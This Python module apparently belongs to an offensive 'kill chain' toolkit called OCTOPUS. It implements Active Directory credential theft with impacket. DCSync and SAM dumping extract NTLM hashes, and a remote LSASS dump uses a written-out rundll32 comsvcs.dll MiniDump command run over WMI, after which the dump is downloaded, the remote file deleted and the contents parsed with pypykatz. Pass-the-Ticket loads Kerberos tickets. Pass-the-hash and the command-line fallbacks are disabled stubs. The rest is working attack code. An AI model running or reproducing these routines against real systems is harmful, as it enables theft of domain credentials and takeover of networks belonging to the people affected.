#!/usr/bin/env python3
"""
Active Directory credential attack module for the OCTOPUS kill chain.

Provides DCSync, a quarantined Pass-the-Hash boundary, Pass-the-Ticket, remote LSASS dumping,
and SAM/SYSTEM registry hive extraction.  All attacks use impacket as the
primary backend with CLI tool fallbacks.

Usage::

    from core.killchain.ad.credential import dcsync
    result = dcsync("10.10.10.100", {"user": "admin", "password": "P@ss", "domain": "CORP"})
"""

from __future__ import annotations

import logging
import os
import shutil
import subprocess

# ── Logging ──────────────────────────────────────────────────────────────
logger = logging.getLogger("octopus.killchain.ad.credential")

# ── ANSI Colors ──────────────────────────────────────────────────────────
C_GREEN = "\033[92m"
C_YELLOW = "\033[93m"
C_RED = "\033[91m"
C_CYAN = "\033[96m"
C_GREY = "\033[90m"
C_BLUE = "\033[94m"
C_MAGENTA = "\033[95m"
C_RESET = "\033[0m"

# ── Constants ────────────────────────────────────────────────────────────
DEFAULT_LOOT_BASE = os.path.expanduser("~/OCTOPUS/loot")
IMPACKET_TIMEOUT = 180
CLI_TIMEOUT = 300


# Internal helpers

def _normalize_creds(creds: dict[str, str] | None) -> dict[str, str]:
    """Return a dict with guaranteed keys: user, password, domain, nthash."""
    defaults: dict[str, str] = {"user": "", "password": "", "domain": "", "nthash": ""}
    if creds:
        defaults.update(creds)
    return defaults


def _loot_dir(target: str) -> str:
    """Return (and create) a per-target loot directory for credential files."""
    path = os.path.join(DEFAULT_LOOT_BASE, target.replace(".", "_"), "creds")
    os.makedirs(path, exist_ok=True)
    return path


def _run_cli(cmd: list[str] | tuple[str, ...], timeout: int = CLI_TIMEOUT) -> str:
    """Execute an explicit argv vector without a shell."""
    if isinstance(cmd, (str, bytes)) or not cmd:
        return "[!] Unsafe CLI command rejected: an argv sequence is required"
    try:
        result = subprocess.run(
            list(cmd), shell=False, capture_output=True, text=True, timeout=timeout,
        )
        return (result.stdout + result.stderr).strip()
    except subprocess.TimeoutExpired:
        logger.warning("CLI command timed out: %s", cmd[0])
        return f"[!] Command timed out after {timeout}s"
    except FileNotFoundError:
        return "[!] Command not found"
    except Exception as exc:
        logger.error("CLI command failed (%s)", type(exc).__name__)
        return f"[!] Command error: {type(exc).__name__}"


def _impacket_auth_string(creds: dict[str, str]) -> str:
    """Build ``DOMAIN/user:password`` string for impacket CLI tools."""
    domain = creds["domain"]
    user = creds["user"]
    password = creds["password"]
    if domain:
        return f"{domain}/{user}:{password}"
    return f"{user}:{password}"


# DCSync

def dcsync(target: str, creds: dict[str, str] | None = None) -> str:
    """Perform a DCSync attack via impacket's ``secretsdump``.

    Extracts all domain password hashes by replicating the NTDS.dit
    database from the Domain Controller.  Requires Domain Admin or
    replication privileges.

    Args:
        target: DC IP or hostname.
        creds: Credential dict (``user``, ``password``, ``domain``, optional ``nthash``).

    Returns:
        Formatted result string with extracted NTLM hashes.
    """
    creds = _normalize_creds(creds)
    print(f"\n  {C_RED}[CRED] DCSync — {target}{C_RESET}")
    output = f"[DCSYNC — {target}]\n{'═' * 60}\n\n"

    if not creds["user"] or not creds["domain"]:
        output += "[!] Domain credentials required for DCSync.\n"
        return output

    loot = _loot_dir(target)
    dump_file = os.path.join(loot, "dcsync_hashes.txt")

    # ── Try impacket Python module ────────────────────────────────
    try:
        from impacket.examples.secretsdump import DumpSecrets  # type: ignore[import-untyped]

        logger.info("Running DCSync via impacket secretsdump module")

        class _Options:
            """Minimal namespace for DumpSecrets."""
            def __init__(self) -> None:
                self.target = f"{creds['domain']}/{creds['user']}:{creds['password']}@{target}"
                self.dc_ip = target
                self.target_ip = target
                self.just_dc = True
                self.just_dc_ntlm = True
                self.just_dc_user = None
                self.use_vss = False
                self.exec_method = "smbexec"
                self.outputfile = dump_file
                self.hashes = f":{creds['nthash']}" if creds["nthash"] else None
                self.no_pass = False
                self.k = False
                self.system = ""
                self.ntds = ""
                self.sam = ""
                self.security = ""
                self.bootkey = ""
                self.history = False
                self.resumefile = None

        dumper = DumpSecrets(_Options())
        dumper.dump()

        if os.path.isfile(dump_file + ".ntds") and os.path.getsize(dump_file + ".ntds") > 0:
            with open(dump_file + ".ntds") as fh:
                hashes = fh.read()
            count = len(hashes.strip().splitlines())
            output += f"[+] DCSync successful — {count} hash(es) extracted\n"
            output += f"    Output: {dump_file}.ntds\n"
            output += f"\n{hashes[:5000]}\n"
            print(f"    {C_GREEN}[+] {count} hashes dumped via DCSync!{C_RESET}")
        elif os.path.isfile(dump_file) and os.path.getsize(dump_file) > 0:
            with open(dump_file) as fh:
                hashes = fh.read()
            count = len(hashes.strip().splitlines())
            output += f"[+] DCSync successful — {count} hash(es) extracted\n"
            output += f"    Output: {dump_file}\n"
            output += f"\n{hashes[:5000]}\n"
            print(f"    {C_GREEN}[+] {count} hashes dumped via DCSync!{C_RESET}")
        else:
            output += "[-] DCSync produced no output — check privileges.\n"
        return output
    except ImportError:
        logger.debug("impacket secretsdump not importable — trying CLI")
    except Exception as exc:
        logger.warning("impacket DCSync failed: %s", exc)
        output += f"[!] impacket error: {exc}\n"

    # ── Fall back to CLI ──────────────────────────────────────────
    cli_bin = shutil.which("secretsdump.py") or shutil.which("impacket-secretsdump")
    if cli_bin:
        output += "[!] Credential-bearing CLI fallback is disabled; use the in-process provider boundary.\n"
    else:
        output += "[!] No impacket secretsdump available. Install impacket.\n"

    return output


# Pass-the-Hash

def pass_the_hash(target: str, credential_handle: str = "") -> str:
    """Fail closed until a target-scoped NT-hash credential adapter exists."""

    del target, credential_handle
    return "[!] Execution denied: unsafe_provider_contract_not_mounted"


# Pass-the-Ticket

def pass_the_ticket(target: str, ticket_file: str,
                    command: str = "whoami") -> str:
    """Execute a command using a Kerberos ticket (Pass-the-Ticket).

    Sets ``KRB5CCNAME`` to the provided ``.ccache`` file and uses
    impacket to authenticate via Kerberos.

    Args:
        target: Target IP or hostname.
        ticket_file: Path to ``.ccache`` ticket file.
        command: Command to execute (default: ``whoami``).

    Returns:
        Formatted result string with command output.
    """
    print(f"\n  {C_CYAN}[CRED] Pass-the-Ticket — {target}{C_RESET}")
    output = f"[PASS-THE-TICKET — {target}]\n{'═' * 60}\n\n"

    if not os.path.isfile(ticket_file):
        output += f"[!] Ticket file not found: {ticket_file}\n"
        return output

    # Set KRB5CCNAME for this process
    os.environ["KRB5CCNAME"] = ticket_file
    output += f"[*] Using ticket: {ticket_file}\n"
    output += f"    KRB5CCNAME={ticket_file}\n\n"

    # ── Try impacket ──────────────────────────────────────────────
    try:
        from impacket.krb5.ccache import CCache

        ccache = CCache.loadFile(ticket_file)
        principal = ccache.principal
        output += f"[+] Ticket principal: {principal}\n"

        # Extract domain info from ticket
        creds_from_ticket = str(principal).split("@")
        user_from_ticket = creds_from_ticket[0] if creds_from_ticket else "unknown"
        domain_from_ticket = creds_from_ticket[1] if len(creds_from_ticket) > 1 else ""

        output += f"    User:   {user_from_ticket}\n"
        output += f"    Domain: {domain_from_ticket}\n"
        print(f"    {C_GREEN}[+] Ticket loaded: {user_from_ticket}@{domain_from_ticket}{C_RESET}")
    except ImportError:
        logger.debug("impacket CCache not available")
        output += "[!] impacket not available for ticket parsing.\n"
    except Exception as exc:
        logger.warning("Ticket parsing failed: %s", exc)
        output += f"[!] Ticket parsing error: {exc}\n"

    # ── Execute via CLI with Kerberos auth ────────────────────────
    cli_bin = shutil.which("smbexec.py") or shutil.which("impacket-smbexec")
    if not cli_bin:
        cli_bin = shutil.which("wmiexec.py") or shutil.which("impacket-wmiexec")

    if cli_bin:
        output += "[!] Ticket-bearing CLI fallback is disabled; use the in-process provider boundary.\n"
    else:
        output += "[!] No impacket exec tool found for PTT. Install impacket.\n"

    return output


# LSASS dump

def dump_lsass(target: str, creds: dict[str, str] | None = None) -> str:
    """Remotely dump LSASS process memory to extract credentials.

    Uses impacket to upload and execute procdump or comsvcs.dll MiniDump,
    then downloads and parses the dump with pypykatz if available.

    Args:
        target: Target IP or hostname.
        creds: Credential dict (``user``, ``password``, ``domain``, optional ``nthash``).

    Returns:
        Formatted result string with extracted credentials.
    """
    creds = _normalize_creds(creds)
    print(f"\n  {C_RED}[CRED] LSASS Dump — {target}{C_RESET}")
    output = f"[LSASS DUMP — {target}]\n{'═' * 60}\n\n"

    if not creds["user"]:
        output += "[!] Credentials required for LSASS dump.\n"
        return output

    loot = _loot_dir(target)
    dump_filename = "lsass.dmp"
    local_dump = os.path.join(loot, dump_filename)

    # ── Method 1: comsvcs.dll via impacket wmiexec ────────────────
    try:
        from impacket.smbconnection import SMBConnection

        logger.info("Connecting to %s for LSASS dump", target)
        smb = SMBConnection(target, target, sess_port=445, timeout=30)

        if creds["nthash"]:
            smb.login(creds["user"], "", creds["domain"],
                      lmhash="", nthash=creds["nthash"])
        else:
            smb.login(creds["user"], creds["password"], creds["domain"])

        output += "[+] SMB connection established\n"

        # Use comsvcs.dll to dump LSASS
        dump_cmd = (
            'powershell -c "'
            "$p = Get-Process lsass; "
            "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, "
            f'MiniDump $p.Id C:\\Windows\\Temp\\{dump_filename} full'
            '"'
        )

        try:
            from impacket.examples.wmiexec import WMIEXEC  # type: ignore[import-untyped]

            executer = WMIEXEC(
                dump_cmd, username=creds["user"],
                password=creds["password"],
                domain=creds["domain"],
                hashes=f":{creds['nthash']}" if creds["nthash"] else "",
                share="ADMIN$",
            )
            executer.run(target, smb)
            output += "[+] LSASS dump command executed\n"
        except (ImportError, Exception) as exc:
            output += f"[!] WMI execution failed: {exc}\n"
            output += "[*] Trying alternative method...\n"
            smb.logoff()
            # Fall through to CLI method
            raise

        # Download the dump
        try:
            with open(local_dump, "wb") as fh:
                smb.getFile("C$", f"Windows\\Temp\\{dump_filename}", fh.write)
            output += f"[+] LSASS dump downloaded → {local_dump}\n"
            dump_size = os.path.getsize(local_dump)
            output += f"    Size: {dump_size:,} bytes\n"

            # Clean up remote dump
            smb.deleteFile("C$", f"Windows\\Temp\\{dump_filename}")
            output += "[+] Remote dump file cleaned up\n"
        except Exception as exc:
            output += f"[!] Failed to download dump: {exc}\n"

        smb.logoff()

        # ── Parse with pypykatz ───────────────────────────────────
        if os.path.isfile(local_dump):
            try:
                import pypykatz  # lazy import

                logger.info("Parsing LSASS dump with pypykatz")
                parsed = pypykatz.parse_minidump_file(local_dump)
                output += "\n[EXTRACTED CREDENTIALS]\n" + "-" * 40 + "\n"
                for _luid, session in parsed.logon_sessions.items():
                    if session.username and session.username != "(null)":
                        output += f"  {session.domain}\\{session.username}\n"
                        if session.lm_hash:
                            output += f"    LM:   {session.lm_hash}\n"
                        if session.nt_hash:
                            output += f"    NTLM: {session.nt_hash}\n"
                        if session.password:
                            output += "    Pass: [REDACTED]\n"
                print(f"    {C_GREEN}[+] Credentials extracted from LSASS!{C_RESET}")
            except ImportError:
                output += "[!] pypykatz not installed — parse dump manually.\n"
                output += f"    pypykatz lsa minidump {local_dump}\n"
            except Exception as exc:
                output += f"[!] pypykatz parsing failed: {exc}\n"

        return output
    except ImportError:
        logger.debug("impacket not available for LSASS dump")
    except Exception as exc:
        logger.warning("LSASS dump method 1 failed: %s", exc)
        if "[!]" not in output:
            output += f"[!] LSASS dump error: {exc}\n"

    # ── Fall back to CLI secretsdump (SAM+LSA) ────────────────────
    cli_bin = shutil.which("secretsdump.py") or shutil.which("impacket-secretsdump")
    if cli_bin:
        output += "[!] Credential-bearing CLI fallback is disabled; use the in-process provider boundary.\n"
    else:
        output += "[!] No LSASS dump method available. Install impacket + pypykatz.\n"

    return output


# SAM dump

def sam_dump(target: str, creds: dict[str, str] | None = None) -> str:
    """Remotely dump the SAM database (local account hashes).

    Uses impacket's ``secretsdump`` targeting SAM+SYSTEM+SECURITY
    registry hives via the remote registry or VSS.

    Args:
        target: Target IP or hostname.
        creds: Credential dict (``user``, ``password``, ``domain``, optional ``nthash``).

    Returns:
        Formatted result string with local account NTLM hashes.
    """
    creds = _normalize_creds(creds)
    print(f"\n  {C_RED}[CRED] SAM Dump — {target}{C_RESET}")
    output = f"[SAM DUMP — {target}]\n{'═' * 60}\n\n"

    if not creds["user"]:
        output += "[!] Credentials required for SAM dump.\n"
        return output

    loot = _loot_dir(target)
    dump_file = os.path.join(loot, "sam_dump")

    # ── Try impacket secretsdump ──────────────────────────────────
    try:
        from impacket.examples.secretsdump import DumpSecrets  # type: ignore[import-untyped]

        logger.info("Running SAM dump via impacket secretsdump")

        class _Options:
            """Minimal namespace for DumpSecrets (SAM only)."""
            def __init__(self) -> None:
                self.target = f"{creds['domain']}/{creds['user']}:{creds['password']}@{target}" if creds["domain"] else f"{creds['user']}:{creds['password']}@{target}"
                self.dc_ip = None
                self.target_ip = target
                self.just_dc = False
                self.just_dc_ntlm = False
                self.just_dc_user = None
                self.use_vss = False
                self.exec_method = "smbexec"
                self.outputfile = dump_file
                self.hashes = f":{creds['nthash']}" if creds["nthash"] else None
                self.no_pass = False
                self.k = False
                self.system = ""
                self.ntds = ""
                self.sam = ""
                self.security = ""
                self.bootkey = ""
                self.history = False
                self.resumefile = None

        dumper = DumpSecrets(_Options())
        dumper.dump()

        # Check for output files
        sam_output = dump_file + ".sam"
        if os.path.isfile(sam_output) and os.path.getsize(sam_output) > 0:
            with open(sam_output) as fh:
                hashes = fh.read()
            count = len(hashes.strip().splitlines())
            output += f"[+] SAM dump successful — {count} local hash(es)\n"
            output += f"    Output: {sam_output}\n"
            output += f"\n{hashes[:3000]}\n"
            print(f"    {C_GREEN}[+] {count} SAM hashes dumped!{C_RESET}")
        else:
            output += "[-] SAM dump produced no output — check permissions.\n"
        return output
    except ImportError:
        logger.debug("impacket secretsdump not importable — trying CLI")
    except Exception as exc:
        logger.warning("impacket SAM dump failed: %s", exc)
        output += f"[!] impacket error: {exc}\n"

    # ── Fall back to CLI ──────────────────────────────────────────
    cli_bin = shutil.which("secretsdump.py") or shutil.which("impacket-secretsdump")
    if cli_bin:
        output += "[!] Credential-bearing CLI fallback is disabled; use the in-process provider boundary.\n"
    else:
        output += "[!] No impacket secretsdump available. Install impacket.\n"

    return output
